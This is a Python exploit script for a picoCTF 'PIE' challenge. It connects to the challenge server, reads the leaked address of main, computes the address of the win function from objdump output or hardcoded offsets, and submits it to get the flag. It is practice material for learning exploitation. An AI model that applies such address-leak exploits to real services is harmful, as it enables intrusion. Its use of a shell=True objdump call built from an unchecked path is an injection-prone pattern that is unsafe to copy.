import socket
import re
import time
import argparse

def get_offsets(binary_path):
    """
    Extracts the main function and win function offsets from a local binary using objdump.
    Requires the binary to be accessible locally.
    """
    try:
        import subprocess

        # Get main function address
        main_output = subprocess.check_output(f"objdump -d {binary_path} | grep '<main>:'", shell=True).decode()
        win_output = subprocess.check_output(f"objdump -d {binary_path} | grep '<win>:'", shell=True).decode()

        main_addr = int(main_output.split()[0], 16)
        win_addr = int(win_output.split()[0], 16)

        offset = win_addr - main_addr
        print(f"[+] Auto-detected win function offset: {hex(offset)}")
        return [offset]  # Return as a list to be used in iteration

    except Exception as e:
        print(f"[!] Could not extract offsets automatically: {e}")
        return [0x1229, 0x1200, 0x1250, 0x1150, 0x1180]  # Default offsets


def exploit_pie_challenge(host, port, binary_path=None):
    """
    Exploits the PIE binary by calculating the win function address dynamically.
    Uses either automated offset detection (if binary_path is provided) or a list of hardcoded offsets.
    """

    print(f"[+] Connecting to {host}:{port}...\n")

    # Determine offsets
    offsets_to_try = get_offsets(binary_path) if binary_path else [0x1229, 0x1200, 0x1250, 0x1150, 0x1180]

    attempt = 0

    while True:  # Keep executing until we get the flag
        try:
            print(f"\n[ Attempt {attempt + 1} ] Connecting...")

            # Automatically close the socket after use
            with socket.create_connection((host, port), timeout=10) as conn:
                
                for win_offset in offsets_to_try:
                    # Receive initial output
                    initial_output = conn.recv(1024).decode('utf-8')

                    # Extract main function address
                    main_addr_match = re.search(r'Address of main: (0x[0-9a-fA-F]+)', initial_output)
                    if not main_addr_match:
                        print("[-] Could not find main address, retrying...")
                        continue

                    main_addr = int(main_addr_match.group(1), 16)
                    print(f"\n[+] Trying offset: {hex(win_offset)}")
                    print(f"    Main address from server: {hex(main_addr)}")

                    # Calculate win function address
                    win_addr = main_addr - 0x1149 + win_offset
                    print(f"    Calculated win address: {hex(win_addr)}")

                    # Send the calculated address
                    conn.send(f"{win_addr:x}\n".encode())

                    # Receive and analyze response
                    response = conn.recv(1024).decode('utf-8')
                    print(response)

                    # Check if we received the flag
                    flag_match = re.search(r'picoCTF{.*?}', response, re.IGNORECASE)
                    if flag_match:
                        print("\n[+] Flag found! Exiting...")
                        print(f"FLAG: {flag_match.group(0)}")
                        return

        except socket.timeout:
            print("[!] Connection timed out. Retrying...")

        except socket.error as e:
            print(f"[!] Connection error: {e}")
            time.sleep(2)  # Wait before retrying
        
        except Exception as e:
            print(f"[!] Unexpected error: {e}")
            break
        
        attempt += 1  # Increment attempt counter

    print("[-] Exploit failed after multiple attempts")


if __name__ == "__main__":
    # Argument parser for flexibility
    parser = argparse.ArgumentParser(description="Exploit for PIE binary challenge")
    parser.add_argument("--host", default="rescued-float.picoctf.net", help="Target server")
    parser.add_argument("--port", type=int, default=56894, help="Target port")
    parser.add_argument("--binary", help="Path to local binary for automatic offset detection")

    args = parser.parse_args()

    # Run the exploit
    exploit_pie_challenge(args.host, args.port, args.binary)
